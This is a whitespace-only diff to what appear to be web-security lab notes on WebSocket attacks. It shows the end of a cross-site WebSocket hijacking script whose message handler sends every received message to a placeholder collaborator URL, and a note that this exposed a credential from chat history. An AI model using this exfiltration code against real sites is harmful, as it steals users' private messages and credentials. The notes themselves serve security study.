@@ -1872,8 +1872,8 @@ CONNECT
        ws.onmessage = function(event) {
            fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
        };
-   </script>
-    ```
+    </script>
+    ```  
    - Poll now > read the http history > found credential in chat history   
 - **Manipulating the WebSocket handshake** to exploit vulnerabilities
   - **XSS has been blocked** and that your WebSocket connection has been terminated
